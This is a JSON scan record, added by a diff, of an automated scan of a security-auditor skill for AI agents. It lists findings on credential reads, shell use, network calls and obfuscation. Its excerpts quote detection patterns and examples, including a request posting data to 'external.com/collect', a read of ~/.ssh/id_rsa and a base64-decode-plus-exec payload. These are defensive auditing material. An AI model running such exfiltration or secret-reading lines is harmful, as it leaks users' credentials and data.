@@ -1,0 +1,287 @@
+{
+  "id": "borghei__claude-skills__engineering~skill-security-auditor",
+  "owner": "borghei",
+  "repo": "Claude-Skills",
+  "path": "engineering/skill-security-auditor",
+  "name": "skill-security-auditor",
+  "description": "Security audit and vulnerability scanning for AI agent skills before install. Detects prompt injection, dangerous code, exfiltration, credential harvesting, and supply chain risks. Use when evaluating untrusted skills or gating installs.",
+  "stars": 1067,
+  "category": "coding",
+  "commit": "2c12c7efaad13a70bdea6e205698a6c4f93a0682",
+  "contentHash": "bbb802c1fa88fc04061b49541f43866877e3607546999c2842048ba75f065268",
+  "repoCreatedAt": "2026-01-13T16:15:31Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/SKILL.md",
+        "line": 31,
+        "excerpt": "- **Code execution risk detection** — command injection (`os.system`, `subprocess shell=True`, backticks), `eval`/`exec`/`compile`, obfuscation (base64/hex/`chr",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/SKILL.md",
+        "line": 31,
+        "excerpt": "- **Code execution risk detection** — command injection (`os.system`, `subprocess shell=True`, backticks), `eval`/`exec`/`compile`, obfuscation (base64/hex/`chr",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "engineering/skill-security-auditor/references/audit-output-and-workflow.md",
+        "line": 23,
+        "excerpt": "Pattern: requests.post(\"https://external.com/collect\", data=results)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "external.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/references/audit-output-and-workflow.md",
+        "line": 29,
+        "excerpt": "Pattern: open(os.path.expanduser(\"~/.ssh/id_rsa\"))",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/references/audit-output-and-workflow.md",
+        "line": 43,
+        "excerpt": "Pattern: subprocess.run([\"ruff\", \"check\", \".\"])",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/references/audit-output-and-workflow.md",
+        "line": 44,
+        "excerpt": "Note: Safe usage with list args and no shell=True",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/references/audit-output-and-workflow.md",
+        "line": 103,
+        "excerpt": "- [ ] No os.system() or subprocess with shell=True",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "engineering/skill-security-auditor/references/audit-output-and-workflow.md",
+        "line": 104,
+        "excerpt": "- [ ] No outbound network requests (requests.post, fetch, socket)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/references/audit-output-and-workflow.md",
+        "line": 105,
+        "excerpt": "- [ ] No reads from ~/.ssh, ~/.aws, ~/.config, or other user directories",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "engineering/skill-security-auditor/references/audit-output-and-workflow.md",
+        "line": 124,
+        "excerpt": "- [ ] No pip install or npm install commands in scripts",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/references/quality-and-best-practices.md",
+        "line": 38,
+        "excerpt": "| False positive on `subprocess.run()` with list arguments | Pattern matches any `subprocess` usage regardless of shell parameter | Verify the call uses a list ",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/references/threat-model-and-patterns.md",
+        "line": 11,
+        "excerpt": "| **Code execution in scripts** | Skill includes Python/Bash scripts with `eval()`, `os.system()`, or `subprocess` that execute arbitrary commands | CRITICAL |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "engineering/skill-security-auditor/references/threat-model-and-patterns.md",
+        "line": 81,
+        "excerpt": "r\"urllib\\.request\\.urlopen\\(\",",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/references/threat-model-and-patterns.md",
+        "line": 88,
+        "excerpt": "r\"~/.ssh\",",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/references/threat-model-and-patterns.md",
+        "line": 89,
+        "excerpt": "r\"~/.aws\",",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/references/threat-model-and-patterns.md",
+        "line": 91,
+        "excerpt": "r\"~/.gnupg\",",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "obfuscated",
+        "file": "engineering/skill-security-auditor/references/threat-model-and-patterns.md",
+        "line": 179,
+        "excerpt": "| Encoded payloads | `exec(base64.b64decode('...'))` | Easy — flag any base64 decode + exec |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 81,
+        "excerpt": "\"risk\": \"Shell command injection via os.system()\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 82,
+        "excerpt": "\"fix\": \"Use subprocess.run() with a list of arguments and shell=False\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 86,
+        "excerpt": "\"risk\": \"Shell command injection via os.popen()\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 87,
+        "excerpt": "\"fix\": \"Use subprocess.run() with a list of arguments and shell=False\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 92,
+        "excerpt": "\"fix\": \"Remove shell=True and pass command as a list of arguments\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 102,
+        "excerpt": "\"regex\": r\"urllib\\.request\\.urlopen\\s*\\(\",",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 126,
+        "excerpt": "\"fix\": \"Remove filesystem access to ~/.ssh entirely\",",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 131,
+        "excerpt": "\"fix\": \"Remove filesystem access to ~/.aws entirely\",",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 136,
+        "excerpt": "\"fix\": \"Remove filesystem access to ~/.gnupg entirely\",",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "engineering/skill-security-auditor/scripts/code_scanner.py",
+        "line": 232,
+        "excerpt": "\"fix\": \"Ensure command is passed as a list and shell=True is not used\",",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "engineering/skill-security-auditor/scripts/supply_chain_checker.py",
+        "line": 7,
+        "excerpt": "inline pip install commands in scripts.",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "engineering/skill-security-auditor/scripts/supply_chain_checker.py",
+        "line": 193,
+        "excerpt": "\"\"\"Scan a file for inline pip/pip3 install commands.\"\"\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "engineering/skill-security-auditor/scripts/supply_chain_checker.py",
+        "line": 367,
+        "excerpt": "\"unpinned versions and detects inline pip install commands.\",",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "reads-secrets": 9,
+      "shell": 12,
+      "network": 4,
+      "downloads-code": 4,
+      "obfuscated": 1
+    },
+    "score": 54,
+    "band": "review",
+    "rulesVersion": "1.2.0",
+    "filesScanned": 8,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "2c12c7efaad13a70bdea6e205698a6c4f93a0682",
+      "scannedAt": "2026-11-07T16:26:42.053Z",
+      "score": 54,
+      "rulesVersion": "1.2.0"
+    }
+  ]
+}
